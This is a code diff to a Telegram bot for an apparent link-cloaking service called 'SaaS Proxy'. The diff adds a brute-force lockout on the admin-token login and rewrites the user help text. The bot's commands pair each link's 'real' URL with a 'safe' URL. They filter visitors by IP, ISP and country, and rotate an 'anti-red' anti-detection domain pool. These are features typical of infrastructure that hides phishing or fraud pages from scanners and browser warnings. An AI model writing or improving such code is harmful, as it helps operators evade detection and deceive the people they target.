@@ -214,6 +214,37 @@ function adminTokenMatches(submitted) {
     } catch { return false; }
 }
 
+// ---- Admin login lockout -------------------------------------------------
+// The HTTP admin path (requireAdmin + adminLimiter in server.js) is
+// per-IP throttled and the dashboard login has an 8-attempt lockout; the
+// /admin_login command previously had neither, letting an attacker with
+// access to any chat guess ADMIN_TOKEN with no throttle. Mirror the same
+// lockout shape here, keyed per chat.
+const ADMIN_LOGIN_LOCKOUTS = new Map(); // chatId -> { attempts, lockedUntil }
+const ADMIN_LOGIN_LOCKOUT_THRESHOLD = 8;
+const ADMIN_LOGIN_LOCKOUT_MS = 15 * 60 * 1000;
+
+function isAdminLoginLocked(chatId) {
+    const key = String(chatId);
+    const lock = ADMIN_LOGIN_LOCKOUTS.get(key);
+    return !!(lock && lock.lockedUntil > Date.now());
+}
+
+function recordAdminLoginFailure(chatId) {
+    const key = String(chatId);
+    const entry = ADMIN_LOGIN_LOCKOUTS.get(key) || { attempts: 0, lockedUntil: 0 };
+    entry.attempts++;
+    if (entry.attempts >= ADMIN_LOGIN_LOCKOUT_THRESHOLD) {
+        entry.attempts = 0;
+        entry.lockedUntil = Date.now() + ADMIN_LOGIN_LOCKOUT_MS;
+    }
+    ADMIN_LOGIN_LOCKOUTS.set(key, entry);
+}
+
+function clearAdminLoginLockout(chatId) {
+    ADMIN_LOGIN_LOCKOUTS.delete(String(chatId));
+}
+
 // ---- Update dispatcher ---------------------------------------------------
 async function handleUpdate(update) {
     if (!update || typeof update !== 'object') return;
@@ -324,56 +355,82 @@ async function cmdStart(chatId, args, msg) {
         const user = await db.findUserById(userId);
         return reply(chatId, `✅ <b>Linked to @${esc(user ? user.username : userId)}.</b>\n\nSend <code>/help</code> to see commands.`);
     }
-    const hello = BOT_USERNAME
-        ? `👋 Send <code>/login &lt;username&gt; &lt;password&gt;</code> here, or open the dashboard, click <b>Connect Telegram</b>, then press the deep link to bind this chat.`
-        : `👋 Send <code>/login &lt;username&gt; &lt;password&gt;</code> here, then <code>/help</code>.`;
+    const hello =
+        `👋 <b>Welcome to SaaS Proxy!</b>\n\n` +
+        `This bot lets you manage your account without opening the dashboard.\n\n` +
+        `<b>To get started, connect your account:</b>\n` +
+        `  • Easiest way: go to your dashboard, click <b>Connect Telegram</b>, then tap the link it gives you.\n` +
+        `  • Or sign in right here: <code>/login your_username your_password</code>\n\n` +
+        `Once connected, send <code>/help</code> to see everything you can do.`;
     return reply(chatId, hello);
 }
 
 async function cmdHelp(chatId) {
     const user = await findUserByChatId(chatId);
-    const base = [
-        '<b>Public</b>',
-        '  /deposit  — deposit address, exchange, min',
-        '  /isps     — ISP allow-list',
-        '  /countries — country code registry',
-        '  /antired  — anti-red rotation pool',
-        '  /newsletter — admin broadcast',
-        '',
-        '<b>Account</b>',
-        '  /login &lt;user&gt; &lt;pass&gt;  — link this chat (or /start &lt;code&gt;)',
-        '  /logout — unlink this chat',
-    ];
-    if (user) {
+    const base = [];
+
+    if (!user) {
         base.push(
+            '🔑 <b>You are not signed in yet.</b>',
+            '  /login your_username your_password — sign in here',
+            '  (or use <b>Connect Telegram</b> on the dashboard)',
+            ''
+        );
+    } else {
+        base.push(`✅ Signed in as <b>@${esc(user.username)}</b>`, '');
+        base.push(
+            '<b>💰 Wallet & links</b>',
+            '  /balance — check your credit balance',
+            '  /links — see your links',
+            '  /newlink name realUrl safeUrl duration [slug]',
+            '      duration options: 3days, 1week, 2weeks, month',
+            '      example: /newlink MyOffer https://real.com https://safe.com 1week',
+            '  /renew slug [duration] — extend an expired link',
+            '  /delete slug — remove a link',
+            '  /history — your deposit/payment history',
+            '  /visitors [count] — recent visits to your links (default 10)',
             '',
-            '<b>Wallet / links</b>',
-            '  /balance  — wallet credits',
-            '  /links    — list active uplinks',
-            '  /newlink &lt;name&gt; &lt;realUrl&gt; &lt;safeUrl&gt; &lt;duration&gt; [&lt;slug&gt;]',
-            '      durations: 3days / 1week / 2weeks / month',
-            '  /renew &lt;slug&gt; [&lt;duration&gt;]',
-            '  /delete &lt;slug&gt;',
-            '  /history  — payments',
-            '  /visitors [N] — last N real visits',
-            '  /block &lt;ip&gt;  /unblock &lt;ip&gt;',
-            '  /force &lt;ip&gt;  /unforce &lt;ip&gt;',
-            '  /settings [key]   — show settings',
-            '  /setsetting &lt;key&gt; &lt;value&gt;'
+            '<b>🛡 Filtering</b>',
+            '  /block ip — always show the safe page to this IP',
+            '  /unblock ip — remove a blocked IP',
+            '  /force ip — always show the real page to this IP',
+            '  /unforce ip — remove a forced IP',
+            '  /settings [key] — view your current settings',
+            '  /setsetting key value — change a setting',
+            ''
         );
     }
+
     base.push(
-        '',
-        '<b>Admin</b>',
-        '  /admin_login &lt;ADMIN_TOKEN&gt;',
-        '  /admin_stats / /admin_users / /admin_user &lt;id&gt;',
-        '  /admin_upd_balance &lt;id&gt; &lt;amount&gt;   /admin_toggle &lt;id&gt;',
-        '  /admin_delete &lt;id&gt;',
-        '  /admin_payments',
-        '  /admin_newsletter &lt;title&gt; | &lt;body&gt;',
-        '  /admin_antired &lt;host1&gt;,&lt;host2&gt;,...',
-        '  /admin_blocks &lt;list|add|del&gt; &lt;ips|isps|countries&gt; [&lt;value&gt;]'
+        '<b>ℹ️ General info</b>',
+        '  /deposit — how to add funds (address, exchange, minimum)',
+        '  /isps — list of supported mobile carriers',
+        '  /countries — list of country codes',
+        '  /antired — anti-detection domain pool',
+        '  /newsletter — latest announcement from the team',
+        '  /logout — unlink this chat from your account',
+        ''
     );
+
+    if (isAdminSession(chatId)) {
+        base.push(
+            '<b>🔐 Admin (signed in)</b>',
+            '  /admin_stats — platform overview',
+            '  /admin_users [page] — list users',
+            '  /admin_user id — view one user',
+            '  /admin_upd_balance id amount — adjust balance',
+            '  /admin_toggle id — enable/disable a user',
+            '  /admin_delete id — delete a user',
+            '  /admin_payments — pending/recent payments',
+            '  /admin_newsletter title | body — publish an announcement',
+            '  /admin_antired host1,host2,... — set anti-red domain pool',
+            '  /admin_blocks list|add|del ips|isps|countries [value]',
+            '  /admin_logout — end your admin session'
+        );
+    } else {
+        base.push('<b>🔐 Admin</b>', '  /admin_login ADMIN_TOKEN — sign in as admin');
+    }
+
     return reply(chatId, base.join('\n'));
 }
 
@@ -464,13 +521,13 @@ async function cmdBalance(_chatId, user) {
 
 async function cmdLinks(_chatId, user) {
     const links = Array.isArray(user.links) ? user.links : [];
-    if (!links.length) return reply(_chatId, 'No uplinks deployed yet.');
+    if (!links.length) return reply(_chatId, 'No links yet. Use /newlink to create one.');
     const rows = links.slice(0, 20).map(l => {
         const expiry = l.expiryDate ? new Date(l.expiryDate).toLocaleString() : '—';
         const active = l.expiryDate && new Date(l.expiryDate) > new Date() ? '🟢' : '⚪';
         return `${active} <b>${esc(l.name || l.slug)}</b>  <code>${esc(l.slug)}</code>\n   expires: ${esc(expiry)}`;
     });
-    return reply(_chatId, `📡 <b>Uplinks</b>:\n${rows.join('\n\n')}`);
+    return reply(_chatId, `📡 <b>Your links</b>:\n${rows.join('\n\n')}`);
 }
 
 async function cmdNewLink(chatId, user, args) {
@@ -518,7 +575,7 @@ async function cmdNewLink(chatId, user, args) {
         wallet: (user.wallet || 0) - price,
         links: [...(user.links || []), link]
     });
-    return reply(chatId, `✅ Uplink <code>${esc(link.slug)}</code> deployed. New balance: <b>$${Number(updated.wallet || 0).toFixed(2)}</b>.`);
+    return reply(chatId, `✅ Link <code>${esc(link.slug)}</code> created. New balance: <b>$${Number(updated.wallet || 0).toFixed(2)}</b>.`);
 }
 
 async function cmdRenew(chatId, user, args) {
@@ -684,7 +741,14 @@ async function cmdSetSetting(chatId, user, args) {
 async function cmdAdminLogin(chatId, args) {
     const token = args[0];
     if (!token) return reply(chatId, 'Usage: <code>/admin_login &lt;ADMIN_TOKEN&gt;</code>');
-    if (!adminTokenMatches(token)) return reply(chatId, '❌ <b>Invalid token.</b>');
+    if (isAdminLoginLocked(chatId)) {
+        return reply(chatId, '⏳ Too many failed attempts. Try again later.');
+    }
+    if (!adminTokenMatches(token)) {
+        recordAdminLoginFailure(chatId);
+        return reply(chatId, '❌ <b>Invalid token.</b>');
+    }
+    clearAdminLoginLockout(chatId);
     grantAdmin(chatId);
     const mins = Math.round(ADMIN_TTL_MS / 60000);
     return reply(chatId, `🔐 Admin session granted for ~${mins} minutes. Use <code>/admin_logout</code> to end sooner.`);
